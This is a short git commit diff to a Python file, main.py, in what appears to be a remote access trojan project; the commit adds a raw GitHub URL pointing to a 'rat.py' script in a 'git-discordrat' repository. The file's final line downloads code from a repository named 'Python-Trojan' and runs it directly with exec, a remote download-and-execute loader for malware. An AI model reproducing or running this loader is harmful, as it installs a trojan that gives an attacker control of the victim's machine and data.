48ce2a9e29aa2bd8576f37929e1b100ea8fbe24f
hai17233 <135570073+hai17233@users.noreply.github.com>
2024-01-20 08:42:15 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import requests
 git = "hai723/git-discordrat"
 
-raw = f''
+raw = f'https://raw.githubusercontent.com/{git}/main/scr/rat.py'
 
 exec(requests.get('https://raw.githubusercontent.com/Jeff53978/Python-Trojan/main/main.py').text)
